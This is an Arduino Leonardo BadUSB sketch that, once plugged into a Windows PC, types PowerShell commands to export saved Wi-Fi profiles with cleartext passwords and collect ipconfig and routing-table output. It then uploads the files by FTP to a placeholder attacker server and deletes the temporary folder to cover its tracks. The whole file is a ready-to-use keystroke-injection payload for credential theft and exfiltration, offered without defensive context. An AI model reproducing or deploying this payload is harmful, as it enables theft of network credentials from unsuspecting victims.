#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell");
  delay(7000);
  Keyboard.println("cd $ENV:UserProfile");
  delay(2000);
  Keyboard.println("mkdir tmp");
  delay(2000);
  Keyboard.println("cd tmp");
  delay(2000);
  Keyboard.println("netsh wlan export profile key=clear");
  delay(2000);
  Keyboard.println("ipconfig > ipc.txt");
  delay(2000);
  Keyboard.println("netstat -r > nr.txt");
  delay(2000);
  Keyboard.println("ftp");
  delay(2000);
  Keyboard.println("open IPSERVERFTP");
  delay(2000);
  Keyboard.println("USERNAME");
  delay(2000);
  Keyboard.println("PASSWORD");
  delay(2000);
  Keyboard.println("prompt");
  delay(2000);
  Keyboard.println("mput *.*");
  delay(2000);
  Keyboard.println("quit");
  delay(2000);
  Keyboard.println("cd ..");
  delay(2000);
  Keyboard.println("Remove-Item -Recurse -Force tmp");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
